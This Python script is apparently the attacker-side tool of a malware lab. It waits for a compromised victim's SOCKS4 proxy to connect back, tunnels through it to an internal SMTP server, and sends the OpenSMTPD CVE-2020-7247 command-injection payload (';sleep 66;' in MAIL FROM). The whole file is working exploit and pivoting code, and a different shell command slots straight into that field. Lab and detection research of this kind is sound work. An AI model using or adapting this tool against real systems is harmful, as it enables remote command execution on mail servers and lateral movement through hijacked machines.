#!/usr/bin/env python3
"""Attacker-side SOCKS4 client for the DressCode lab.

The malware connects here after receiving CREATE,<host>,<port> from the C2.
This script then sends a byte-faithful SOCKS4 CONNECT request and performs a
small SMTP conversation through the victim proxy.
"""

from __future__ import annotations

import argparse
import ipaddress
import socket
import struct
from datetime import datetime


SOCKS4_VERSION = 0x04
SOCKS4_CONNECT = 0x01
SOCKS4_GRANTED = 0x5A


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def log(msg: str) -> None:
    print(f"[{ts()}] [ATTACKER] {msg}", flush=True)


def hexdump(data: bytes) -> str:
    return " ".join(f"{b:02x}" for b in data)


def recv_some(sock: socket.socket, timeout: float = 3.0) -> bytes:
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            part = sock.recv(4096)
            if not part:
                break
            chunks.append(part)
            if len(part) < 4096:
                break
        except socket.timeout:
            break
    return b"".join(chunks)


def recv_smtp_reply(sock: socket.socket, timeout: float = 3.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    code: bytes | None = None
    while True:
        line = bytearray()
        while not line.endswith(b"\n"):
            part = sock.recv(1)
            if not part:
                return bytes(data)
            line += part
        data += line
        if len(line) < 4 or not line[:3].isdigit():
            return bytes(data)
        if code is None:
            code = bytes(line[:3])
        if line[:3] == code and line[3:4] == b" ":
            return bytes(data)


def recv_exact(sock: socket.socket, size: int, timeout: float = 10.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            raise ConnectionError("connection closed while receiving fixed response")
        data += part
    return bytes(data)


def build_socks4_connect(target_ip: str, target_port: int, user_id: str) -> bytes:
    ip_bytes = ipaddress.IPv4Address(target_ip).packed
    return bytes([SOCKS4_VERSION, SOCKS4_CONNECT]) + struct.pack("!H", target_port) + ip_bytes + user_id.encode("ascii") + b"\x00"


def smtp_send(sock: socket.socket, line: str) -> None:
    payload = line.encode("ascii") + b"\r\n"
    sock.sendall(payload)
    log(f"SMTP TX {payload!r}")


def run_smtp_cve_2020_7247_probe(sock: socket.socket, args: argparse.Namespace) -> None:
    banner = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {banner!r}")

    smtp_send(sock, f"EHLO {args.ehlo_name}")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")

    smtp_send(sock, f"MAIL FROM:<{args.mail_from}>")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")

    smtp_send(sock, f"RCPT TO:<{args.rcpt_to}>")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")

    smtp_send(sock, "DATA")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")

    for line in args.message_lines:
        smtp_send(sock, line)
    smtp_send(sock, ".")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")

    smtp_send(sock, "QUIT")
    response = recv_smtp_reply(sock, args.smtp_timeout)
    log(f"SMTP RX {response!r}")


def main() -> None:
    parser = argparse.ArgumentParser(description="SOCKS4 client that waits for victim proxy connection")
    parser.add_argument("--bind", default="0.0.0.0", help="listener address for victim connection")
    parser.add_argument("--port", type=int, default=9002, help="listener port sent by C2 CREATE")
    parser.add_argument("--target-ip", default="10.0.2.2", help="SMTP server IP as seen by the victim")
    parser.add_argument("--target-port", type=int, default=2525, help="SMTP server port")
    parser.add_argument("--user-id", default="", help="SOCKS4 USERID field")
    parser.add_argument("--ehlo-name", default="attacker.lab")
    parser.add_argument(
        "--mail-from",
        default=";sleep 66;",
        help="MAIL FROM local part matching the Qualys/OpenSMTPD CVE-2020-7247 PoC signature",
    )
    parser.add_argument("--rcpt-to", default="root@vulnerable-smtp.lab")
    parser.add_argument(
        "--message-lines",
        nargs="*",
        default=["Subject: CVE-2020-7247 lab", "", "benign lab message"],
    )
    parser.add_argument("--smtp-timeout", type=float, default=2.0)
    parser.add_argument("--accept-timeout", type=float, default=0.5, help="listener timeout for Ctrl+C handling")
    args = parser.parse_args()

    request = build_socks4_connect(args.target_ip, args.target_port, args.user_id)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.bind, args.port))
        srv.listen(1)
        srv.settimeout(args.accept_timeout)
        log(f"listening for victim proxy on {args.bind}:{args.port}")
        log(f"will request SOCKS4 CONNECT {args.target_ip}:{args.target_port}")
        try:
            while True:
                try:
                    conn, peer = srv.accept()
                    break
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            log("Ctrl+C received; shutting down")
            return

        try:
            with conn:
                log(f"victim proxy connected from {peer[0]}:{peer[1]}")
                conn.sendall(request)
                log(f"SOCKS4 TX {hexdump(request)}")

                reply = recv_exact(conn, 8)
                log(f"SOCKS4 RX {hexdump(reply)}")
                if len(reply) != 8 or reply[1] != SOCKS4_GRANTED:
                    raise SystemExit(f"SOCKS4 request not granted: {hexdump(reply)}")

                log("SOCKS4 CONNECT granted; SMTP bytes now traverse victim proxy")
                run_smtp_cve_2020_7247_probe(conn, args)
        except KeyboardInterrupt:
            log("Ctrl+C received; shutting down")


if __name__ == "__main__":
    main()

